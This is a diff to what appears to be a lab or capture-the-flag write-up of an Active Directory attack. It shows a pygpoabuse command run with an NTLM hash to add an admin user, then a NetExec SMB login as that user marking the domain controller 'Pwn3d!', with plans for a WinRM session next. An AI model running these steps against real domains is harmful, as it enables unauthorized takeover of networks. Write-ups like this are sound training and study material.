@@ -677,5 +677,12 @@ python3 pygpoabuse.py 'hsm.local'/'bbarkinson' -hashes ':53c3709ae3d9f4428a230db
 This created the task, once the group policy refreshes on the domain controller i should have a new user `john` with admin privs
 
 ```python
+nxc smb DC01.hsm.local -u john -p 'H4x00r123..'
+SMB         10.0.22.198     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:hsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.22.198     445    DC01             [+] hsm.local\john:H4x00r123.. (Pwn3d!)
+```
+The creds are valid ill now get a session via winrm
+
+```python
 
 ```
